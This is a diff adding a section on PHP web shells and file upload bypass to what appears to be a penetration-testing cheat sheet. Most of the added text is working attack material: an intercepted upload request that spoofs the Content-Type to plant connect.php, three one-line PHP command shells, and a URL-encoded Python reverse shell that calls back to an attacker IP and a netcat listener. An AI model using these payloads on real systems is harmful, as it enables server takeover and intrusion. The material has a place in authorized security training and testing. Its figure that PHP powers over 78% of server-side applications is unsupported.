@@ -1179,4 +1179,83 @@ Upload `Upload.aspx` through the vulnerable web application upload form:
 
 ---
 
+# PHP Web Shells & File Upload Bypass
 
+## Overview
+
+PHP powers over 78% of server-side web applications globally. When penetration testing web applications built on PHP stacks (LAMP/LEMP), exploiting file upload mechanisms allows dropping a PHP script into the webroot to gain initial **Remote Code Execution (RCE)**.
+
+Because simple web shells are stateless, limited, and logged by web servers, operators use them primarily to achieve an initial foothold before pivoting to an interactive **Reverse Shell**.
+
+```
+[ Unrestricted / Bypassed Upload ] ──> [ Drop connect.php ] ──> [ Execute Web Shell ] ──> [ Upgrade to Reverse Shell ]
+```
+
+## 1. File Upload Filter Bypass (MIME/Content-Type)
+
+Web applications often enforce extension and MIME-type checks to restrict uploads to safe file formats (e.g., `.png`, `.jpg`, `.gif`). Client-side or naive server-side MIME checks rely on the HTTP `Content-Type` header, which can be intercepted and modified via an HTTP proxy like Burp Suite.
+
+### Intercepted HTTP Request Modification
+
+```http
+POST /vendors/addVendor.php HTTP/1.1
+Host: rconfig.inlanefreight.local
+Content-Type: multipart/form-data; boundary=---------------------------123456789
+
+-----------------------------123456789
+Content-Disposition: form-format; name="vendorLogo"; filename="connect.php"
+Content-Type: image/gif
+
+<?php system($_GET['cmd']); ?>
+-----------------------------123456789--
+```
+
+#### Key Modifications
+
+- **Filename:** Retains the `.php` extension (`connect.php`) so the web server parses and executes the script.
+    
+- **Content-Type Header:** Changed from `application/x-php` to `image/gif` to bypass naive MIME validation.
+    
+
+## 2. Minimal & Feature-Rich PHP Web Shells
+
+### Minimal One-Liner Web Shells
+
+```php
+/* Primitive GET parameter shell */
+<?php system($_GET['cmd']); ?>
+
+/* Exec wrapper shell */
+<?php echo shell_exec($_GET['cmd']); ?>
+
+/* Passthru wrapper shell */
+<?php passthru($_GET['cmd']); ?>
+```
+
+Usage in browser:
+
+```http
+http://target.com/images/vendor/connect.php?cmd=whoami
+```
+
+## 3. Web Shell Limitations & Operational Risks
+
+|**Operational Metric**|**Web Shell (HTTP Stream)**|**Interactive Reverse Shell (nc / Meterpreter)**|
+|---|---|---|
+|**State Persistence**|Stateless; directory resets between requests (`cd /tmp` won't stick).|Stateful; active persistent working directory.|
+|**Command Chaining**|Unstable (`whoami && id` can fail depending on functions).|Native shell command chaining (`&&`, `\|`).|
+|**Interactive Binaries**|Fails on interactive prompts (`su`, `sudo`, `ssh`, `vim`).|Supported via PTY allocation (`python -c 'import pty...'`).|
+|**Persistence Risk**|High; vulnerable to web app cleanup jobs or AV scans on disk.|Medium; execution runs from memory or background processes.|
+|**Logging Footprint**|Every single command creates a discrete entry in web server `access.log`.|Traffic travels over a raw TCP/TLS socket bypass web logs.|
+
+## 4. Upgrading PHP Web Shell to Interactive Reverse Shell
+
+Once the PHP web shell is active, execute a reverse shell command string directly through the browser or `curl` to establish a persistent connection back to your netcat listener:
+
+```bash
+# Attacker Listener:
+sudo nc -lvnp 443
+
+# Trigger Outbound Reverse Shell via Web Shell URL:
+http://target.com/images/vendor/connect.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+```
